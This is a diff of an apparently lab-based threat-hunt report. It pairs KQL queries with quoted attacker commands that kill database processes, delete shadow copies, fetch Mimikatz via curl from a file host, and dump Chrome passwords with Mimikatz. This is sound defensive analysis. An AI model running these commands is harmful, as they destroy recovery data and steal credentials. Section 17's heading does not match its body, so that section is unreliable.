@@ -299,7 +299,7 @@ DeviceProcessEvents
 
 ### 15. Defense Evasion: Process Termination
 
-Searched for evidence of process termination and discovered that the threat actor executed the following process termination command to forcefully terminate SQL Server: "taskkill" /F /IM sqlservr.exe. In addition, other database processes (e.g., MySQL, Oracle, PostgreSQL, MongoDB) and Office applications (e.g., Outlook, Excel) were also forcefully terminated across multiple systems. This was likely performed to release file locks on high-value data stores, ensuring the ransomware could successfully encrypt the underlying database files and documents without interference.
+Searched for evidence of process termination and discovered that the threat actor executed the following process termination command to forcefully terminate SQL Server: "taskkill" /F /IM sqlservr.exe. In addition, other database processes (e.g., MySQL, Oracle, PostgreSQL, MongoDB) and Office applications (e.g., Outlook, Excel, Word) were also forcefully terminated across multiple systems. This was likely performed to release file locks on high-value data stores, ensuring the ransomware could successfully encrypt the underlying database files and documents without interference.
 
 **Query used to locate events:**
 
@@ -318,28 +318,32 @@ DeviceProcessEvents
 
 ### 16. Impact: Recovery Point Deletion
 
-Searched for evidence of... 
-
-credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+Searched for evidence of recovery point deletion and discovered that the threat actor executed the following command: "vssadmin.exe" delete shadows /all /quiet. Therefore, all volume shadow copies were deleted using vssadmin with the /quiet flag to suppress output. This eliminated all Windows restore points and previous file versions, making file-level recovery impossible through native Windows mechanisms.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated >= datetime(2025-11-19)
-| where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
-| project TimeGenerated, ProcessCommandLine
-| order by TimeGenerated asc
+| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName contains "azuki"
+| where FileName in~ ("vssadmin.exe", "wmic.exe", "wbadmin.exe")
+| where ProcessCommandLine contains "delete" 
+    and (ProcessCommandLine contains "shadow" 
+         or ProcessCommandLine contains "catalog"
+         or ProcessCommandLine contains "backup")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| sort by TimeGenerated asc
 
 ```
-<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+<img width="2097" height="616" alt="DITW_Q19" src="https://github.com/user-attachments/assets/0f757a85-b778-4226-8390-3e9e80cb1522" />
 
 ---
 
-### 17. Credential Access: Browser Credential Theft
+### 17. Impact: Storage Limitation
 
-Searched for evidence of credential theft targeting browser password stores and discovered that the attacker utilized the following Mimikatz command to extract Chrome saved passwords by decrypting the Login Data database using Windows Data Protection API (DPAPI): "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit. Note that dpapi::chrome is the Chrome credential extraction module and /unprotect is used to decrypt credentials using Windows DPAPI.
+Searched for evidence of...
+
+credential theft targeting browser password stores and discovered that the attacker utilized the following Mimikatz command to extract Chrome saved passwords by decrypting the Login Data database using Windows Data Protection API (DPAPI): "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit. Note that dpapi::chrome is the Chrome credential extraction module and /unprotect is used to decrypt credentials using Windows DPAPI.
 
 
 **Query used to locate events:**
